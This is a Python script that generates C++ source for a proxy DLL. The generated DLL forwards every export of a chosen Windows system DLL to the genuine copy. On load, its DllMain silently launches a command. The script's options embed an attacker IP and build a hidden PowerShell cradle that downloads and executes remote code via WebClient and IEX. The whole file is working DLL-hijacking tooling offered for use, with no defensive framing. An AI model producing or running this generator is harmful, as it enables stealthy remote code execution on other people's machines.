import pefile
import argparse
import os
import sys

def main():
    parser = argparse.ArgumentParser(description="Generate a proxy DLL")
    parser.add_argument("dll", help="Path to the DLL to generate a proxy for")
    parser.add_argument("--output", "-o", help="Generated C++ proxy file to write to")
    parser.add_argument("--force-ordinals", "-v", action="store_true", help="Force matching ordinals")

    # Custom arguments
    parser.add_argument("--cmd", help="Command to execute inside DLL_PROCESS_ATTACH")
    parser.add_argument("--ip", help="IP address to embed inside generated DLL")
    parser.add_argument("--down", help="Download file using WebClient but do not execute")
    parser.add_argument("--downexe", help="Download file using WebClient and execute via IEX")

    args = parser.parse_args()

    dll: str = args.dll
    output: str = args.output

    user_cmd: str = args.cmd
    user_ip: str = args.ip
    user_down: str = args.down
    user_downexe: str = args.downexe

    # Defaults
    if user_ip is None:
        user_ip = "0.0.0.0"

    # Priority: --downexe > --down > --cmd
    if user_downexe:
        user_cmd = (
            f"powershell -nop -w hidden -c "
            f"\"iex (New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_downexe}')\""
        )

    elif user_down:
        user_cmd = (
            f"powershell -nop -w hidden -c "
            f"\"(New-Object System.Net.WebClient).DownloadString('http://{user_ip}/{user_down}')\""
        )

    elif user_cmd is None:
        user_cmd = "echo NoCommandProvided"

    basename = os.path.basename(dll)

    if output is None:
        file, _ = os.path.splitext(basename)
        output = f"{file}.cpp"

    if not os.path.exists(dll) and not os.path.isabs(dll):
        dll = os.path.join(os.environ["SystemRoot"], "System32", dll)

    if not os.path.exists(dll):
        print(f"File not found: {dll}")
        sys.exit(1)

    # Enumerate exports
    pe = pefile.PE(dll)
    regular_exports = []
    com_exports = []
    ordinal_exports = []
    
    for exp in pe.DIRECTORY_ENTRY_EXPORT.symbols:
        ordinal = exp.ordinal
        if exp.name is None:
            ordinal_exports.append((f"__proxy{ordinal}", ordinal))
        else:
            name = exp.name.decode()
            if name in {
                "DllCanUnloadNow",
                "DllGetClassObject",
                "DllInstall",
                "DllRegisterServer",
                "DllUnregisterServer",
            }:
                com_exports.append(name)
            else:
                regular_exports.append(name)

    with open(output, "w") as f:

        f.write(f'#define TARGET_IP "{user_ip}"\n')
        f.write("#include <Windows.h>\n\n")

        macros = []
        if regular_exports:
            macros.append(f'#define MAKE_EXPORT(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}." func')
        if com_exports:
            macros.append(f'#define MAKE_EXPORT_PRIVATE(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}." func ",PRIVATE"')
        if ordinal_exports:
            macros.append(f'#define MAKE_EXPORT_ORDINAL(func, ord) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\System32\\\\{basename}.#" #ord ",@" #ord ",NONAME"')

        macros_32 = []
        if regular_exports:
            macros_32.append(f'#define MAKE_EXPORT(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}." func')
        if com_exports:
            macros_32.append(f'#define MAKE_EXPORT_PRIVATE(func) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}." func ",PRIVATE"')
        if ordinal_exports:
            macros_32.append(f'#define MAKE_EXPORT_ORDINAL(func, ord) "/EXPORT:" func "=\\\\\\\\.\\\\GLOBALROOT\\\\SystemRoot\\\\SysWOW64\\\\{basename}.#" #ord ",@" #ord ",NONAME"')

        if macros:
            f.write("#ifdef _WIN64\n")
            for macro in macros:
                f.write(f"{macro}\n")
            f.write("#else\n")
            for macro in macros_32:
                f.write(f"{macro}\n")
            f.write("#endif // _WIN64\n\n")

        for export_name in regular_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT(\"{export_name}\"))\n")

        for export_name in com_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT_PRIVATE(\"{export_name}\"))\n")

        for export_name, ordinal in ordinal_exports:
            f.write(f"#pragma comment(linker, MAKE_EXPORT_ORDINAL(\"{export_name}\", {ordinal}))\n")

        # DllMain with dynamic execution logic
        f.write(f"""
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{{
    switch (fdwReason)
    {{
        case DLL_PROCESS_ATTACH:
        {{
            STARTUPINFOA si = {{ 0 }};
            PROCESS_INFORMATION pi = {{ 0 }};
            si.cb = sizeof(si);
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_HIDE;

            CreateProcessA(
                NULL,
                (LPSTR)"cmd.exe /c {user_cmd}",
                NULL,
                NULL,
                FALSE,
                CREATE_NO_WINDOW,
                NULL,
                NULL,
                &si,
                &pi
            );
        }}
        break;

        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }}
    return TRUE;
}}
""")

if __name__ == "__main__":
    main()
